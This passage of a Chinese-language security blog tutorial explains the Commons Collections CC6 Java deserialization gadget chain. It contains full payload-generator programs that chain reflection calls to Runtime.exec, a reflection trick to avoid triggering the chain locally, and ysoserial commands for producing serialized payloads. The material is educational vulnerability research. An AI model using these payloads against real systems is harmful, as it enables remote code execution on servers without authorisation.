+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chain);</span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;xxx&quot;</span>);</span><br><span class="line"><span class="type">HashSet</span> <span class="variable">hashSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br></pre></td></tr></table></figure>
+
+<p>此时 HashSet 和 TiedMapEntry 还没有关联，没有效果：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image10.png"></p>
+<p>需要把 TiedMapEntry 添加进 HashSet，才能在 readObject 的 for 循环里被遍历到。构造方法不传参，所以用 add：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashSet.add(entry);</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>但这里就碰到问题了。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image11.png"></p>
+<p>**add() 方法内部也会调用 <code>map.put(e, PRESENT)</code>**，这意味着在本地添加元素的时候就已经触发了一次 hashCode()，链子直接在序列化阶段就跑了。</p>
+<p>如果 payload 直接这么写：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chain);</span><br><span class="line"></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;xxx&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">HashSet</span> <span class="variable">hashSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">hashSet.add(entry); <span class="comment">// ⚠️ 这里就执行了 calc，计算器直接在本机弹了</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> (<span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;payload.ser&quot;</span>))) &#123;</span><br><span class="line">    oos.writeObject(hashSet);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>序列化的时候就被触发了：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image12.png"></p>
+<p>反序列化的时候反而没有触发：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image13.png"></p>
+<hr>
+<h3 id="缓存问题的根因"><a href="#缓存问题的根因" class="headerlink" title="缓存问题的根因"></a>缓存问题的根因</h3><p>问题出在 LazyMap 的 get() 方法里的缓存机制：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image14.png"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// 关键判断：检查 map 仓库里是否已经有了这个 key</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="comment">// 只有仓库里【没有】这个 key，才会触发 transform</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        <span class="comment">// 进货完成后，把结果存入仓库（产生缓存）</span></span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果仓库里【已经有】这个 key 了，直接返回旧值</span></span><br><span class="line">    <span class="comment">// 此时根本不会走到上面的 transform() 逻辑</span></span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>一句话总结：只要 innerMap 不是空的，恶意链就永远没机会上场。</strong></p>
+<p>整个流程是这样的：</p>
+<ol>
+<li>本地 <code>hashSet.add(entry)</code> 触发了 <code>lazyMap.get(&quot;xxx&quot;)</code></li>
+<li>因为 innerMap 是空的，第一次会执行 transform（弹计算器），然后把 <code>&#123;&quot;xxx&quot;: 结果&#125;</code> 这个键值对缓存到 innerMap 里</li>
+<li>反序列化时，HashSet.readObject() 再次走到 <code>lazyMap.get(&quot;xxx&quot;)</code></li>
+<li>此时 innerMap 里已经有 “xxx” 这个 key 了，直接返回缓存值，不再执行 transform</li>
+</ol>
+<hr>
+<h3 id="解法一：add-之后直接-clear"><a href="#解法一：add-之后直接-clear" class="headerlink" title="解法一：add 之后直接 clear"></a>解法一：add 之后直接 clear</h3><p>既然问题是缓存，那清掉就行了：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hashSet.add(entry); <span class="comment">// 此时触发命令，innerMap 产生缓存</span></span><br><span class="line">innerMap.clear();   <span class="comment">// 清空缓存，之后序列化进去的 innerMap 是空的</span></span><br></pre></td></tr></table></figure>
+
+<p>完整 payload（简化版，序列化时会弹一次，反序列化时再弹一次）：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6Simple</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 1. 真正的恶意链</span></span><br><span class="line">        Transformer[] trueTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">trueChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(trueTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 构造 LazyMap</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(innerMap, trueChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 创建 TiedMapEntry 并添加进 HashSet</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">hashSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        hashSet.add(entry); <span class="comment">// ⚠️ 此时会弹一次计算器，innerMap 产生缓存</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 清空缓存，否则反序列化时 LazyMap.get 会直接返回旧值</span></span><br><span class="line">        innerMap.clear();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5. 序列化</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;payload.ser&quot;</span>))) &#123;</span><br><span class="line">            oos.writeObject(hashSet);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;payload.ser 生成完毕&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行效果：序列化时弹一次（因为 add 触发），但 innerMap 已被清空：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image15.png"></p>
+<p>反序列化时正常触发：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image16.png"></p>
+<hr>
+<h3 id="解法二（完整版）：假链-反射换真链"><a href="#解法二（完整版）：假链-反射换真链" class="headerlink" title="解法二（完整版）：假链 + 反射换真链"></a>解法二（完整版）：假链 + 反射换真链</h3><p>如果不想让序列化阶段弹窗（更接近实战场景），可以先用假链条占位，等 add 完成之后再通过反射把真链换进去，最后清缓存。</p>
+<p>思路：</p>
+<ol>
+<li>先构造一个无害的假链（只返回常量 1，不执行任何命令）</li>
+<li>用假链构造 LazyMap，然后 add 进 HashSet，此时触发的是假链，不会弹窗</li>
+<li>通过反射把 LazyMap 内部的 factory 字段从假链换成真链</li>
+<li>清空 innerMap 缓存</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6Generator</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 1. 真正的恶意链条</span></span><br><span class="line">        Transformer[] trueTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">trueChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(trueTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 构造假链条——防止本地弹窗</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">fakeChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 也可以用 ChainedTransformer 包一个 ConstantTransformer(1) 的数组</span></span><br><span class="line">        <span class="comment">//Transformer[] fakeTransformers = new Transformer[]&#123; new ConstantTransformer(1) &#125;;</span></span><br><span class="line">        <span class="comment">//ChainedTransformer fakeChain = new ChainedTransformer(fakeTransformers);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 组装 LazyMap 和 TiedMapEntry，绑定的是假链</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(innerMap, fakeChain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;pwn&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 添加进 HashSet，触发假链（innerMap 产生缓存 &#123;&quot;pwn&quot;: 1&#125;，但不弹窗）</span></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">hashSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        hashSet.add(entry);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ===== 反射调包环节 =====</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5. 反射：将 LazyMap 的 factory 字段从假链换成真链</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazyMap, trueChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 6. 清空 innerMap 缓存</span></span><br><span class="line">        <span class="comment">// 必须清空，否则反序列化时 containsKey(&quot;pwn&quot;) 成立，直接返回旧值，不触发命令</span></span><br><span class="line">        innerMap.clear();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ===== 序列化输出 =====</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;payload.ser&quot;</span>))) &#123;</span><br><span class="line">            oos.writeObject(hashSet);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;Payload 生成完毕！序列化阶段未触发，缓存已清空。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>效果：序列化阶段不触发，反序列化时正常弹窗。</p>
+<blockquote>
+<p><strong>补充</strong>：上面假链用的接口是 <code>Transformer</code>可以传入int参数，其实也可以换成 ChainedTransformer 接口。但 ChainedTransformer 的构造函数需要传入 <code>Transformer[]</code> 数组，不能直接传 int，所以需要包一层：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123; <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">fakeChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br></pre></td></tr></table></figure>
+</blockquote>
+<hr>
+<h2 id="对比-ysoserial-的实现"><a href="#对比-ysoserial-的实现" class="headerlink" title="对比 ysoserial 的实现"></a>对比 ysoserial 的实现</h2><p>ysoserial 里也有 CC6 的实现，可以直接用：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections6 <span class="string">&quot;calc&quot;</span> &gt; cc6.ser</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image17.png"></p>
+<p>把生成的 cc6.ser 放到项目根目录，用之前写的反序列化代码跑一下，可以正常触发：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image18.png"></p>
+<p>在 <code>ysoserial/payloads/</code> 下能找到 CommonsCollections6.class：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image19.png"></p>
+<p>看了下源码，ysoserial 的实现思路大差不差，不过它不是先传假链，而是直接传了一个无害字符串占位，然后通过反射直接修改底层的链条。另外原版还做了更多细节处理来保证兼容性，总体思路是一致的。</p>
+<hr>
+<h2 id="为什么说-CC6-是通杀链"><a href="#为什么说-CC6-是通杀链" class="headerlink" title="为什么说 CC6 是通杀链"></a>为什么说 CC6 是通杀链</h2><p>CC6 在 <strong>JDK 版本兼容性</strong> 和 <strong>依赖环境稳定性</strong> 上远优于 CC1、CC2 这些链：</p>
+<ul>
+<li><strong>通杀 JDK 6 ~ 8u71 以及 8u71 以上的所有版本</strong>（直到 Commons Collections 被修复的版本）</li>
+<li>触发路径（HashSet → TiedMapEntry → LazyMap）完全不依赖 AnnotationInvocationHandler，绕开了 8u71 的修复</li>
+<li>HashSet&#x2F;HashMap 是 JDK 标准库里最稳定的类，不会因版本迭代被修改</li>
+</ul>
+<p>所以在实际打 Java 反序列化的时候，如果不确定对端 JDK 版本，CC6 往往是优先选择的链。</p>
+<p>ysoserial 使用方式：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar [利用链名称] <span class="string">&#x27;[要执行的命令]&#x27;</span> &gt; payload.bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 例如：</span></span><br><span class="line">java -jar ysoserial.jar CommonsCollections6 <span class="string">&quot;calc&quot;</span> &gt; cc6.ser</span><br></pre></td></tr></table></figure>
+</article>
+<div class="article-footer">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+
+</div>
+
+
+
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"></div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-CC6-%E9%93%BE-%E2%80%94%E2%80%94-%E5%8F%8D%E5%90%91%E6%9E%84%E9%80%A0-payload-%E4%B8%8E-ysoserial"><span class="toc-text">代码审计 | CC6 链 —— 反向构造 payload 与 ysoserial</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81-CC6%EF%BC%9FCC1-%E7%9A%84%E9%99%90%E5%88%B6"><span class="toc-text">为什么需要 CC6？CC1 的限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC6-%E5%AD%98%E5%9C%A8%E7%9A%84%E6%84%8F%E4%B9%89"><span class="toc-text">CC6 存在的意义</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88-CC6-%E8%83%BD%E7%BB%95%E8%BF%87-JDK-%E9%99%90%E5%88%B6%EF%BC%9F"><span class="toc-text">为什么 CC6 能绕过 JDK 限制？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE%E5%85%A8%E8%B2%8C"><span class="toc-text">调用链全貌</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E6%AD%A5%E6%AD%A5%E6%9E%84%E9%80%A0-CC6"><span class="toc-text">一步步构造 CC6</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E7%94%A8-ChainedTransformer-%E4%B8%B2%E8%81%94%E6%81%B6%E6%84%8F%E9%93%BE"><span class="toc-text">第一步：用 ChainedTransformer 串联恶意链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9ALazyMap-get-%E8%A7%A6%E5%8F%91-transform"><span class="toc-text">第二步：LazyMap.get() 触发 transform</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E8%B0%81%E8%B0%83%E7%94%A8-get-%EF%BC%9F%E2%80%94%E2%80%94TiedMapEntry-getValue"><span class="toc-text">第三步：谁调用 get()？——TiedMapEntry.getValue()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E8%B0%81%E8%B0%83%E7%94%A8-getValue-%EF%BC%9F%E2%80%94%E2%80%94TiedMapEntry-hashCode"><span class="toc-text">第四步：谁调用 getValue()？——TiedMapEntry.hashCode()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9AHashSet-readObject-%E8%A7%A6%E5%8F%91-hashCode"><span class="toc-text">第五步：HashSet.readObject() 触发 hashCode()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%A7%E5%9D%91%EF%BC%9A%E5%BA%8F%E5%88%97%E5%8C%96%E6%97%B6%E5%B0%B1%E8%A7%A6%E5%8F%91%E4%BA%86"><span class="toc-text">大坑：序列化时就触发了</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%93%E5%AD%98%E9%97%AE%E9%A2%98%E7%9A%84%E6%A0%B9%E5%9B%A0"><span class="toc-text">缓存问题的根因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%9Aadd-%E4%B9%8B%E5%90%8E%E7%9B%B4%E6%8E%A5-clear"><span class="toc-text">解法一：add 之后直接 clear</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C%EF%BC%88%E5%AE%8C%E6%95%B4%E7%89%88%EF%BC%89%EF%BC%9A%E5%81%87%E9%93%BE-%E5%8F%8D%E5%B0%84%E6%8D%A2%E7%9C%9F%E9%93%BE"><span class="toc-text">解法二（完整版）：假链 + 反射换真链</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9%E6%AF%94-ysoserial-%E7%9A%84%E5%AE%9E%E7%8E%B0"><span class="toc-text">对比 ysoserial 的实现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%AF%B4-CC6-%E6%98%AF%E9%80%9A%E6%9D%80%E9%93%BE"><span class="toc-text">为什么说 CC6 是通杀链</span></a></li></ol></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
